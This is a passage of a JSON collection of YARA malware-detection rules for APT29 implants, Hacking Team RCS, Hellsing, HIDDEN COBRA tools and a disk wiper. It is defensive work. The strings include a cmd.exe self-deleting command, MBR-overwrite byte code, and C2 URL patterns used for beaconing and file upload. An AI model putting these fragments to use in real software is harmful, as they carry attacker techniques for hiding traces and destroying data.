  "IMPLANT_8_v1": "rule IMPLANT_8_v1\n{\n   meta:\n      description = \"HAMMERTOSS / HammerDuke Implant by APT29\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $DOTNET = \"mscorlib\" ascii\n      $REF_URL = \"https://www.google.com/url?sa=\" wide\n      $REF_var_1 = \"&rct=\" wide\n      $REF_var_2 = \"&q=&esrc=\" wide\n      $REF_var_3 = \"&source=\" wide\n      $REF_var_4 = \"&cd=\" wide\n      $REF_var_5 = \"&ved=\" wide\n      $REF_var_6 = \"&url=\" wide\n      $REF_var_7 = \"&ei=\" wide\n      $REF_var_8 = \"&usg=\" wide\n      $REF_var_9 = \"&bvm=\" wide\n      $REF_value_1 = \"QFj\" wide\n      $REF_value_2 = \"bv.81\" wide\n   condition:\n      (uint16(0) == 0x5A4D) and ($DOTNET) and ($REF_URL) and\n      (3 of ($REF_var*)) and (1 of ($REF_value*))\n}",
  "IMPLANT_8_v2": "rule IMPLANT_8_v2 {\n   meta:\n      description = \"HAMMERTOSS / HammerDuke Implant by APT29\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $DOTNET= \"mscorlib\" ascii\n      $XOR = {61 20 AA 00 00 00 61}\n   condition:\n      (uint16(0) == 0x5A4D) and all of them\n}",
  "IMPLANT_9_v1": "rule IMPLANT_9_v1 {\n   meta:\n      description = \"Onion Duke Implant by APT29\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = { 8B 03 8A 54 01 03 32 55 FF 41 88 54 39 FF 3B CE 72 EE }\n      $STR2 = { 8B C8 83 E1 03 8A 54 19 08 8B 4D 08 32 54 01 04 40 88 54 38 FF\n         3B C6 72 E7 }\n      $STR3 = { 8B 55 F8 8B C8 83 E1 03 8A 4C 11 08 8B 55 FC 32 0C 10 8B 17 88\n         4C 02 04 40 3B 06 72 E3 }\n   condition:\n      (uint16(0) == 0x5A4D or uint16(0)) and all of them\n}",
  "IMPLANT_10_v1": "rule IMPLANT_10_v1 {\n   meta:\n      description = \"CozyDuke / CozyCar / CozyBear Implant by APT29\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = {33 ?? 83 F2 ?? 81 E2 FF 00 00 00}\n      $STR2 = {0F BE 14 01 33 D0 ?? F2 [1-4] 81 E2 FF 00 00 00 66 89 [6] 40 83\n         F8 ?? 72}\n   condition:\n      uint16(0) == 0x5A4D and ($STR1 or $STR2)\n}",
  "IMPLANT_10_v2": "rule IMPLANT_10_v2 {\n   meta:\n      description = \"CozyDuke / CozyCar / CozyBear Implant by APT29\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $xor = { 34 ?? 66 33 C1 48 FF C1 }\n      $nop = { 66 66 66 66 66 66 0f 1f 84 00 00 00 00 00}\n   condition:\n      uint16(0) == 0x5A4D and $xor and $nop\n}",
  "IMPLANT_11_v12": "rule IMPLANT_11_v12 {\n   meta:\n      description = \"Mini Duke Implant by APT29\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = {63 74 00 00} // ct\n      $STR2 = {72 6F 74 65} // rote\n      $STR3 = {75 61 6C 50} // triV\n      $STR4 = {56 69 72 74} // Plau\n      $STR5 = { e8 00 00 00 00 }\n      $STR6 = { 64 FF 35 00 00 00 00 }\n      $STR7 = {D2 C0}\n      $STR8 = /\\x63\\x74\\x00\\x00.{3,20}\\x72\\x6F\\x74\\x65.{3,20}\\x75\\x61\\x6C\\x50.{3,20}\\x56\\x69\\x72\\x74/\n   condition:\n      (uint16(0) == 0x5A4D) and #STR5 > 4 and all of them\n}",
  "IMPLANT_12_v1": "rule IMPLANT_12_v1 {\n   meta:\n      description = \"Cosmic Duke Implant by APT29\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $FUNC = {A1 [3-5] 33 C5 89 [2-3] 56 57 83 [4-6] 64}\n   condition:\n      (uint16(0) == 0x5A4D) and $FUNC\n}",
  "Unidentified_Malware_Two": "rule Unidentified_Malware_Two {\n   meta:\n      description = \"Unidentified Implant by APT29\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $my_string_one = \"/zapoy/gate.php\"\n      $my_string_two = { E3 40 FE 45 FD 0F B6 45 FD 0F B6 14 38 88 55 FF 00 55\n         FC 0F B6 45 FC 8A 14 38 88 55 FE 0F B6 45 FD 88 14 38 0F B6 45 FC 8A\n         55 FF 88 14 38 8A 55 FF 02 55 FE 8A 14 3A 8B 45 F8 30 14 30 }\n      $my_string_three = \"S:\\\\Lidstone\\\\renewing\\\\HA\\\\disable\\\\In.pdb\"\n      $my_string_four = { 8B CF 0F AF CE 8B C6 99 2B C2 8B 55 08 D1 F8 03 C8\n         8B 45 FC 03 C2 89 45 10 8A 00 2B CB 32 C1 85 DB 74 07 }\n      $my_string_five = \"fuckyou1\"\n      $my_string_six = \"xtool.exe\"\n   condition:\n      ($my_string_one and $my_string_two)\n      or ($my_string_three or $my_string_four)\n      or ($my_string_five and $my_string_six)\n}",
  "bin_ndisk": "rule bin_ndisk  \n{\n    \n    meta:\n        description = \"Hacking Team Disclosure Sample - file ndisk.sys\"\n        author = \"Florian Roth\"\n        reference = \"https://www.virustotal.com/en/file/a03a6ed90b89945a992a8c69f716ec3c743fa1d958426f4c50378cca5bef0a01/analysis/1436184181/\"\n        date = \"2015-07-07\"\n        hash = \"cf5089752ba51ae827971272a5b761a4ab0acd84\"\n    \n    strings:\n        $s1 = \"\\\\Registry\\\\Machine\\\\System\\\\ControlSet00%d\\\\services\\\\ndisk.sys\" fullword wide\n        $s2 = \"\\\\Registry\\\\Machine\\\\System\\\\ControlSet00%d\\\\Enum\\\\Root\\\\LEGACY_NDISK.SYS\" fullword wide\n        $s3 = \"\\\\Driver\\\\DeepFrz\" fullword wide\n        $s4 = \"Microsoft Kernel Disk Manager\" fullword wide\n        $s5 = \"ndisk.sys\" fullword wide\n        $s6 = \"\\\\Device\\\\MSH4DEV1\" fullword wide\n        $s7 = \"\\\\DosDevices\\\\MSH4DEV1\" fullword wide\n        $s8 = \"built by: WinDDK\" fullword wide\n    \n    condition:\n        uint16(0) == 0x5a4d and filesize < 30KB and 6 of them\n}",
  "Hackingteam_Elevator_DLL": "rule Hackingteam_Elevator_DLL \n{\n\n    meta:\n        description = \"Hacking Team Disclosure Sample - file elevator.dll\"\n        author = \"Florian Roth\"\n        reference = \"http://t.co/EG0qtVcKLh\"\n        date = \"2015-07-07\"\n        hash = \"b7ec5d36ca702cc9690ac7279fd4fea28d8bd060\"\n   \n    strings:\n        $s1 = \"\\\\sysnative\\\\CI.dll\" fullword ascii\n        $s2 = \"setx TOR_CONTROL_PASSWORD\" fullword ascii\n        $s3 = \"mitmproxy0\" fullword ascii\n        $s4 = \"\\\\insert_cert.exe\" fullword ascii\n        $s5 = \"elevator.dll\" fullword ascii\n        $s6 = \"CRTDLL.DLL\" fullword ascii\n        $s7 = \"fail adding cert\" fullword ascii\n        $s8 = \"DownloadingFile\" fullword ascii\n        $s9 = \"fail adding cert: %s\" fullword ascii\n        $s10 = \"InternetOpenA fail\" fullword ascii\n   \n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and 6 of them\n}",
  "HackingTeam_Elevator_EXE": "rule HackingTeam_Elevator_EXE \n{\n\n    meta:\n        description = \"Hacking Team Disclosure Sample - file elevator.exe\"\n        author = \"Florian Roth\"\n        reference = \"Hacking Team Disclosure elevator.c\"\n        date = \"2015-07-07\"\n        hash1 = \"40a10420b9d49f87527bc0396b19ec29e55e9109e80b52456891243791671c1c\"\n        hash2 = \"92aec56a859679917dffa44bd4ffeb5a8b2ee2894c689abbbcbe07842ec56b8d\"\n        hash = \"9261693b67b6e379ad0e57598602712b8508998c0cb012ca23139212ae0009a1\"\n\n    strings:\n        $x1 = \"CRTDLL.DLL\" fullword ascii\n        $x2 = \"\\\\sysnative\\\\CI.dll\" fullword ascii\n        $x3 = \"\\\\SystemRoot\\\\system32\\\\CI.dll\" fullword ascii\n        $x4 = \"C:\\\\\\\\Windows\\\\\\\\Sysnative\\\\\\\\ntoskrnl.exe\" fullword ascii /* PEStudio Blacklist: strings */\n        $s1 = \"[*] traversing processes\" fullword ascii /* PEStudio Blacklist: strings */\n        $s2 = \"_getkprocess\" fullword ascii /* PEStudio Blacklist: strings */\n        $s3 = \"[*] LoaderConfig %p\" fullword ascii /* PEStudio Blacklist: strings */\n        $s4 = \"loader.obj\" fullword ascii /* PEStudio Blacklist: strings */\n        $s5 = \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3\" ascii /* PEStudio Blacklist: strings */\n        $s6 = \"[*] token restore\" fullword ascii /* PEStudio Blacklist: strings */\n        $s7 = \"elevator.obj\" fullword ascii\n        $s8 = \"_getexport\" fullword ascii /* PEStudio Blacklist: strings */\n   \n    condition:\n        uint16(0) == 0x5a4d and filesize < 3000KB and all of ($x*) and 3 of ($s*)\n}",
  "RCS_Backdoor": "rule RCS_Backdoor\n{\n    \n    meta:\n        description = \"Hacking Team RCS Backdoor\"\n        author = \"botherder https://github.com/botherder\"\n\n    strings:\n        $filter1 = \"$debug3\"\n        $filter2 = \"$log2\"\n        $filter3 = \"error2\"\n        $debug1 = /\\- (C)hecking components/ wide ascii\n        $debug2 = /\\- (A)ctivating hiding system/ wide ascii\n        $debug3 = /(f)ully operational/ wide ascii\n        $log1 = /\\- Browser activity \\(FF\\)/ wide ascii\n        $log2 = /\\- Browser activity \\(IE\\)/ wide ascii\n        // Cause false positives.\n        //$log3 = /\\- About to call init routine at %p/ wide ascii\n        //$log4 = /\\- Calling init routine at %p/ wide ascii\n        $error1 = /\\[Unable to deploy\\]/ wide ascii\n        $error2 = /\\[The system is already monitored\\]/ wide ascii\n\n    condition:\n        (2 of ($debug*) or 2 of ($log*) or all of ($error*)) and not any of ($filter*)\n}",
  "RCS_Scout": "rule RCS_Scout\n{\n    \n    meta:\n        description = \"Hacking Team RCS Scout\"\n        author = \"botherder https://github.com/botherder\"\n\n    strings:\n        $filter1 = \"$engine5\"\n        $filter2 = \"$start4\"\n        $filter3 = \"$upd2\"\n        $filter4 = \"$lookma6\"\n\n        $engine1 = /(E)ngine started/ wide ascii\n        $engine2 = /(R)unning in background/ wide ascii\n        $engine3 = /(L)ocking doors/ wide ascii\n        $engine4 = /(R)otors engaged/ wide ascii\n        $engine5 = /(I)\\'m going to start it/ wide ascii\n\n        $start1 = /Starting upgrade\\!/ wide ascii\n        $start2 = /(I)\\'m going to start the program/ wide ascii\n        $start3 = /(i)s it ok\\?/ wide ascii\n        $start4 = /(C)lick to start the program/ wide ascii\n\n        $upd1 = /(U)pdJob/ wide ascii\n        $upd2 = /(U)pdTimer/ wide ascii\n\n        $lookma1 = /(O)wning PCI bus/ wide\n        $lookma2 = /(F)ormatting bios/ wide\n        $lookma3 = /(P)lease insert a disk in drive A:/ wide\n        $lookma4 = /(U)pdating CPU microcode/ wide\n        $lookma5 = /(N)ot sure what's happening/ wide\n        $lookma6 = /(L)ook ma, no thread id\\! \\\\\\\\o\\// wide\n\n    condition:\n        (all of ($engine*) or all of ($start*) or all of ($upd*) or 4 of ($lookma*)) and not any of ($filter*)\n}",
  "apt_hellsing_implantstrings": "rule apt_hellsing_implantstrings\n{ \n  \n    meta:\n        Author = \"Costin Raiu, Kaspersky Lab\"\n        Date = \"2015-04-07\"\n        Description = \"detection for Hellsing implants\"\n        Reference = \"http://securelist.com/analysis/publications/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back\"\n\n    strings: \n        $mz=\"MZ\"\n        $a1=\"the file uploaded failed !\" \n        $a2=\"ping 127.0.0.1\"      \n        $b1=\"the file downloaded failed !\" \n        $b2=\"common.asp\"\n        $c=\"xweber_server.exe\" \n        $d=\"action=\"\n        $debugpath1=\"d:\\\\Hellsing\\\\release\\\\msger\\\\\" nocase \n        $debugpath2=\"d:\\\\hellsing\\\\sys\\\\xrat\\\\\" nocase \n        $debugpath3=\"D:\\\\Hellsing\\\\release\\\\exe\\\\\" nocase \n        $debugpath4=\"d:\\\\hellsing\\\\sys\\\\xkat\\\\\" nocase \n        $debugpath5=\"e:\\\\Hellsing\\\\release\\\\clare\" nocase \n        $debugpath6=\"e:\\\\Hellsing\\\\release\\\\irene\\\\\" nocase \n        $debugpath7=\"d:\\\\hellsing\\\\sys\\\\irene\\\\\" nocase\n        $e=\"msger_server.dll\"\n        $f=\"ServiceMain\"\n\n    condition:\n        ($mz at 0) and (all of ($a*)) or (all of ($b*)) or ($c and $d) or (any of ($debugpath*)) or ($e and $f) and filesize < 500000\n}",
  "apt_hellsing_installer": "rule apt_hellsing_installer\n{\n    \n    meta:\n        Author = \"Costin Raiu, Kaspersky Lab\"\n        Date = \"2015-04-07\"\n        Description = \"detection for Hellsing xweber/msger installers\"\n        Reference = \"http://securelist.com/analysis/publications/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back\" \n\n    strings: \n        $mz=\"MZ\"\n        $cmd=\"cmd.exe /c ping 127.0.0.1 -n 5&cmd.exe /c del /a /f \\\"%s\\\"\"\n        $a1=\"xweber_install_uac.exe\"\n        $a2=\"system32\\\\cmd.exe\" wide\n        $a4=\"S11SWFOrVwR9UlpWRVZZWAR0U1aoBHFTUl2oU1Y=\" \n        $a5=\"S11SWFOrVwR9dnFTUgRUVlNHWVdXBFpTVgRdUlpWRVZZWARdUqhZVlpFR1kEUVNSXahTVgRaU1YEUVNSXahTVl1SWwRZValdVFFZUqgQBF1SWlZFVllYBFRTVqg=\" $a6=\"7dqm2ODf5N/Y2N/m6+br3dnZpunl44g=\"\n        $a7=\"vd/m7OXd2ai/5u7a59rr7Ki45drcqMPl5t/c5dqIZw==\" \n        $a8=\"vd/m7OXd2ai/usPl5qjY2uXp69nZqO7l2qjf5u7a59rr7Kjf5tzr2u7n6euo4+Xm39zl2qju5dqo4+Xm39zl2t/m7ajr19vf2OPr39rj5eaZmqbs5OSI Njl2tyI\" $a9=\"C:\\\\Windows\\\\System32\\\\sysprep\\\\sysprep.exe\" wide \n        $a10=\"%SystemRoot%\\\\system32\\\\cmd.exe\" wide \n        $a11=\"msger_install.dll\"\n        $a12={00 65 78 2E 64 6C 6C 00}\n\n    condition:\n        ($mz at 0) and ($cmd and (2 of ($a*))) and filesize < 500000\n}",
  "apt_hellsing_proxytool": "rule apt_hellsing_proxytool\n{\n    \n    meta:\n        Author = \"Costin Raiu, Kaspersky Lab\"\n        Date = \"2015-04-07\"\n        Description = \"detection for Hellsing proxy testing tool\"\n        Reference = \"http://securelist.com/analysis/publications/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back\" \n\n    strings: \n        $mz=\"MZ\"\n        $a1=\"PROXY_INFO: automatic proxy url => %s \" \n        $a2=\"PROXY_INFO: connection type => %d \" \n        $a3=\"PROXY_INFO: proxy server => %s \" \n        $a4=\"PROXY_INFO: bypass list => %s \" \n        $a5=\"InternetQueryOption failed with GetLastError() %d\" \n        $a6=\"D:\\\\Hellsing\\\\release\\\\exe\\\\exe\\\\\" nocase\n\n    condition:\n        ($mz at 0) and (2 of ($a*)) and filesize < 300000\n}",
  "apt_hellsing_xkat": "rule apt_hellsing_xkat \n{\n    \n    meta:\n        Author = \"Costin Raiu, Kaspersky Lab\"\n        Date = \"2015-04-07\"\n        Description = \"detection for Hellsing xKat tool\"\n        Reference = \"http://securelist.com/analysis/publications/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back\"\n\n    strings:\n        $mz=\"MZ\"\n        $a1=\"\\\\Dbgv.sys\"\n        $a2=\"XKAT_BIN\"\n        $a3=\"release sys file error.\"\n        $a4=\"driver_load error. \"\n        $a5=\"driver_create error.\"\n        $a6=\"delete file:%s error.\"\n        $a7=\"delete file:%s ok.\"\n        $a8=\"kill pid:%d error.\"\n        $a9=\"kill pid:%d ok.\"\n        $a10=\"-pid-delete\"\n        $a11=\"kill and delete pid:%d error.\"\n        $a12=\"kill and delete pid:%d ok.\"\n\n    condition:\n        ($mz at 0) and (6 of ($a*)) and filesize < 300000\n}",
  "apt_hellsing_msgertype2": "rule apt_hellsing_msgertype2\n{\n    \n    meta:\n        Author = \"Costin Raiu, Kaspersky Lab\"\n        Date = \"2015-04-07\"\n        Description = \"detection for Hellsing msger type 2 implants\"\n        Reference = \"http://securelist.com/analysis/publications/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back\"\n\n    strings:\n        $mz=\"MZ\"\n        $a1=\"%s\\\\system\\\\%d.txt\"\n        $a2=\"_msger\"\n        $a3=\"http://%s/lib/common.asp?action=user_login&uid=%s&lan=%s&host=%s&os=%s&proxy=%s\"\n        $a4=\"http://%s/data/%s.1000001000\"\n        $a5=\"/lib/common.asp?action=user_upload&file=\"\n        $a6=\"%02X-%02X-%02X-%02X-%02X-%02X\"\n    \n    condition:\n        ($mz at 0) and (4 of ($a*)) and filesize < 500000\n}",
  "apt_hellsing_irene": "rule apt_hellsing_irene\n{\n    \n    meta:\n        Author = \"Costin Raiu, Kaspersky Lab\"\n        Date = \"2015-04-07\"\n        Description = \"detection for Hellsing msger irene installer\"\n        Reference = \"http://securelist.com/analysis/publications/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back\"\n\n    strings: \n        $mz=\"MZ\"\n        $a1=\"\\\\Drivers\\\\usbmgr.tmp\" wide\n        $a2=\"\\\\Drivers\\\\usbmgr.sys\" wide\n        $a3=\"common_loadDriver CreateFile error! \" \n        $a4=\"common_loadDriver StartService error && GetLastError():%d! \" \n        $a5=\"irene\" wide\n        $a6=\"aPLib v0.43 - the smaller the better\" \n\n    condition:\n        ($mz at 0) and (4 of ($a*)) and filesize < 500000\n}",
  "apt_hiddencobra_rsakey": "rule apt_hiddencobra_rsakey {\n\nmeta:\n\n\tdescription = \"HIDDEN COBRA \u2013 North Korea\u2019s DDoS Botnet Infrastructure\" \n\tauthor = \"US-CERT\"\n\turl = \"https://www.us-cert.gov/ncas/alerts/TA17-164A\"\n\nstrings:\n\n    $rsaKey = {7B 4E 1E A7 E9 3F 36 4C DE F4 F0 99 C4 D9 B7 94\n\n    A1 FF F2 97 D3 91 13 9D C0 12 02 E4 4C BB 6C 77\n\n    48 EE 6F 4B 9B 53 60 98 45 A5 28 65 8A 0B F8 39\n\n    73 D7 1A 44 13 B3 6A BB 61 44 AF 31 47 E7 87 C2\n\n    AE 7A A7 2C 3A D9 5C 2E 42 1A A6 78 FE 2C AD ED\n\n    39 3F FA D0 AD 3D D9 C5 3D 28 EF 3D 67 B1 E0 68\n\n    3F 58 A0 19 27 CC 27 C9 E8 D8 1E 7E EE 91 DD 13\n\n    B3 47 EF 57 1A CA FF 9A 60 E0 64 08 AA E2 92 D0}\n\ncondition: \n\tany of them\n}",
  "apt_hiddencobra_binaries": "rule apt_hiddencobra_binaries {\n\nmeta:\n\n    description = \"HIDDEN COBRA \u2013 North Korea\u2019s DDoS Botnet Infrastructure\" \n    author = \"US-CERT\"\n    url = \"https://www.us-cert.gov/ncas/alerts/TA17-164A\"\n\nstrings:\n\n   $STR1 = \"Wating\" wide ascii\n\n   $STR2 = \"Reamin\" wide ascii\n\n   $STR3 = \"laptos\" wide ascii\n\ncondition: \n    (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and 2 of them\n}",
  "apt_hiddencobra_urlbuilder": "rule apt_hiddencobra_urlbuilder {\n\nmeta:\n\n    description = \"HIDDEN COBRA \u2013 North Korea\u2019s DDoS Botnet Infrastructure\" \n    author = \"US-CERT\"\n    url = \"https://www.us-cert.gov/ncas/alerts/TA17-164A\"\n\nstrings:\n\n$randomUrlBuilder = { 83 EC 48 53 55 56 57 8B 3D ?? ?? ?? ?? 33 C0 C7 44 24 28 B4 6F 41 00 C7 44 24 2C B0 6F 41 00 C7 44 24 30 AC 6F 41 00 C7 44 24 34 A8 6F 41 00 C7 44 24 38 A4 6F 41 00 C7 44 24 3C A0 6F 41 00 C7 44 24 40 9C 6F 41 00 C7 44 24 44 94 6F 41 00 C7 44 24 48 8C 6F 41 00 C7 44 24 4C 88 6F 41 00 C7 44 24 50 80 6F 41 00 89 44 24 54 C7 44 24 10 7C 6F 41 00 C7 44 24 14 78 6F 41 00 C7 44 24 18 74 6F 41 00 C7 44 24 1C 70 6F 41 00 C7 44 24 20 6C 6F 41 00 89 44 24 24 FF D7 99 B9 0B 00 00 00 F7 F9 8B 74 94 28 BA 9C 6F 41 00 66 8B 06 66 3B 02 74 34 8B FE 83 C9 FF 33 C0 8B 54 24 60 F2 AE 8B 6C 24 5C A1 ?? ?? ?? ?? F7 D1 49 89 45 00 8B FE 33 C0 8D 5C 11 05 83 C9 FF 03 DD F2 AE F7 D1 49 8B FE 8B D1 EB 78 FF D7 99 B9 05 00 00 00 8B 6C 24 5C F7 F9 83 C9 FF 33 C0 8B 74 94 10 8B 54 24 60 8B FE F2 AE F7 D1 49 BF 60 6F 41 00 8B D9 83 C9 FF F2 AE F7 D1 8B C2 49 03 C3 8B FE 8D 5C 01 05 8B 0D ?? ?? ?? ?? 89 4D 00 83 C9 FF 33 C0 03 DD F2 AE F7 D1 49 8D 7C 2A 05 8B D1 C1 E9 02 F3 A5 8B CA 83 E1 03 F3 A4 BF 60 6F 41 00 83 C9 FF F2 AE F7 D1 49 BE 60 6F 41 00 8B D1 8B FE 83 C9 FF 33 C0 F2 AE F7 D1 49 8B FB 2B F9 8B CA 8B C1 C1 E9 02 F3 A5 8B C8 83 E1 03 F3 A4 8B 7C 24 60 8D 75 04 57 56 E8 ?? ?? ?? ?? 83 C4 08 C6 04 3E 2E 8B C5 C6 03 00 5F 5E 5D 5B 83 C4 48 C3 }\n\ncondition: \n    $randomUrlBuilder\n}",
  "Malware_Updater": "rule Malware_Updater\n{\nmeta:\n\tAuthor=\"US-CERT Code Analysis Team\"\n\tDate=\"2017/08/02\"\n\tIncident=\"10132963\"\n\tMD5_1=\"8F4FC2E10B6EC15A01E0AF24529040DD\"\n\tMD5_2=\"584AC94142F0B7C0DF3D0ADDE6E661ED\"\n\tInfo=\"Malware may be used to update multiple systems with secondary payloads\"\n\tsuper_rule=1\n\treport = \"https://www.us-cert.gov/sites/default/files/publications/MAR-10132963.pdf\"\n\treport = \"https://www.us-cert.gov/HIDDEN-COBRA-North-Korean-Malicious-Cyber-Activity\"\nstrings:\n\t$s0 = { 8A4C040480F15D80C171884C04044083F8107CEC }\n\t$s1 = { 8A4D0080F19580E97C884D00454B75F0 }\ncondition: \n\tany of them\n}",
  "Unauthorized_Proxy_Server_RAT": "rule Unauthorized_Proxy_Server_RAT\n{\nmeta:\n\tAuthor=\"US-CERT Code Analysis Team\"\n\tIncident=\"10135536\"\n\tMD5_1 = \"C74E289AD927E81D2A1A56BC73E394AB\"\n\tMD5_2 = \"2950E3741D7AF69E0CA0C5013ABC4209\"\n\tInfo=\"Detects Proxy Server RAT\"\n\tsuper_rule = 1\n\treport = \"https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-B_WHITE.PDF\"\n\treport = \"https://www.us-cert.gov/HIDDEN-COBRA-North-Korean-Malicious-Cyber-Activity\"\nstrings:\n\t$s0 = {8A043132C288043125FF00000003C299F73D40404900A14440490003D0413BCF72DE5E5FC3}\n\t$s1 = {8A04318844241432C28804318B44241425FF00000003C299F73D40404900A14440490003D0413BCF72D65E5FC3}\n\t$s2 = {8A04318844241432C28804318B44241425FF00000003C299F73D5C394100A16039410003D0413BCF72D65E5FC3}\n\t$s3 = {8A043132C288043125FF00000003C299F73D5C394100A16039410003D0413BCF72DE5E5FC3}\n\t$s4 = {B91A7900008A140780F29A8810404975F4}\n\t$s5 = {399FE192769F839DCE9F2A9D2C9EAD9CEB9FD19CA59F7E9F539CEF9F029F969C6C9E5C9D949FC99F}\n\t$s6 = {8A04318844241432C28804318B44241425FF00000003C299F73D40600910A14460091003D0413BCF72D65E5FC3}\n\t$s7 = {3C5C75208A41014184C074183C72740C3C7474083C6274043C2275088A41014184C075DC}\n\t$s8 = {8B063D9534120077353D59341200722E668B4604663DE8037F24}\n\t$s9 = {8BC88B74241CC1E1052BC88B7C2418C1E1048B5C241403C88D04888B4C242083F9018944240C7523}\n\t$s10 = {8B063D9034120077353D59341200722E668B4604663DE8037F246685C0}\n\t$s11 = {30110FB60148FFC102C20FBEC09941F7F94103D249FFC875E7}\n\t$s12 = {448BE8B84FECC44E41F7EDC1FA038BCAC1E91F03D16BD21A442BEA4183C541}\n\t$s13 = {8A0A80F9627C2380F9797F1E80F9647C0A80F96D7F0580C10BEB0D80F96F7C0A80F9787F05}\ncondition:\n\tany of them\n}",
  "NK_SSL_PROXY": "rule NK_SSL_PROXY{\nmeta:\n\tAuthor = \"US-CERT Code Analysis Team\"\n\tDate = \"2018/01/09\"\n\tMD5_1 = \"C6F78AD187C365D117CACBEE140F6230\"\n\tMD5_2 = \"C01DC42F65ACAF1C917C0CC29BA63ADC\"\n\tInfo= \"Detects NK SSL PROXY\"\n\treport = \"https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-G.PDF\"\n\treport = \"https://www.us-cert.gov/HIDDEN-COBRA-North-Korean-Malicious-Cyber-Activity\"\nstrings:\n\t$s0 = {8B4C24088A140880F24780C228881408403BC67CEF5E}\n\t$s1 = {568B74240C33C085F67E158B4C24088A140880EA2880F247881408403BC67CEF5E}\n\t$s2 = {4775401F713435747975366867766869375E2524736466}\n\t$s3 = {67686667686A75797566676467667472}\n\t$s4 = {6D2A5E265E676866676534776572}\n\t$s5 = {3171617A5853444332337765}\n\t$s6 = \"ghfghjuyufgdgftr\"\n\t$s7 = \"q45tyu6hgvhi7^%$sdf\"\n\t$s8 = \"m*^&^ghfge4wer\"\ncondition:\n\t($s0 and $s1 and $s2 and $s3 and $s4 and $s5) or ($s6 and $s7 and $s8)\n}",
  "r4_wiper_1": "rule r4_wiper_1\n{\nmeta:\n\tsource = \"NCCIC Partner\"\n\tdate = \"2017-12-12\"\n\treport = \"https://www.us-cert.gov/sites/default/files/publications/MAR-10135536.11.WHITE.pdf\"\n\treport = \"https://www.us-cert.gov/HIDDEN-COBRA-North-Korean-Malicious-Cyber-Activity\"\nstrings:\n\t$mbr_code = { 33 C0 8E D0 BC 00 7C FB 50 07 50 1F FC BE 5D 7C 33 C9 41 81 F9 00 ?? 74 24 B4 43 B0 00 CD 13 FE C2 80 FA 84 7C F3 B2 80 BF 65 7C 81 05 00 04 83 55 02 00 83 55 04 00 83 55 06 00 EB D5 BE 4D 7C B4 43 B0 00 CD 13 33 C9 BE 5D 7C EB C5 }\n\t$controlServiceFoundlnBoth = { 83 EC 1C 57 68 3F 00 0F 00 6A 00 6A 00 FF 15 ?? ?? ?? ?? 8B F8 85 FF 74 44 8B 44 24 24 53 56 6A 24 50 57 FF 15 ?? ?? ?? ?? 8B 1D ?? ?? ?? ?? 8B F0 85 F6 74 1C 8D 4C 24 0C 51 6A 01 56 FF 15 ?? ?? ?? ?? 68 E8 03 00 00 FF 15 ?? ?? ?? ?? 56 FF D3 57 FF D3 5E 5B 33 C0 5F 83 C4 1C C3 33 C0 5F 83 C4 1C C3 }\ncondition:\n\tuint16(0) == 0x5a4d and uint16(uint32(0x3c)) == 0x4550 and any of them\n}",
  "r4_wiper_2": "rule r4_wiper_2\n{\nmeta:\n\tsource = \"NCCIC Partner\"\n\tdate = \"2017-12-12\"\n\treport = \"https://www.us-cert.gov/sites/default/files/publications/MAR-10135536.11.WHITE.pdf\"\n\treport = \"https://www.us-cert.gov/HIDDEN-COBRA-North-Korean-Malicious-Cyber-Activity\"\nstrings:\n\t// BIOS Extended Write\n\t$PhysicalDriveSTR = \"\\\\\\\\.\\\\PhysicalDrive\" wide\n\t$ExtendedWrite = { B4 43 B0 00 CD 13 }\ncondition:\n\tuint16(0) == 0x5a4d and uint16(uint32(0x3c)) == 0x4550 and all of them\n}",
  "APT_Hikit_msrv": "rule APT_Hikit_msrv\n{\n\nmeta:\n    author = \"ThreatConnect Intelligence Research Team\"\n\nstrings:\n    $m = {6D 73 72 76 2E 64 6C 6C 00 44 6C 6C}\n\ncondition:\n    any of them\n}",
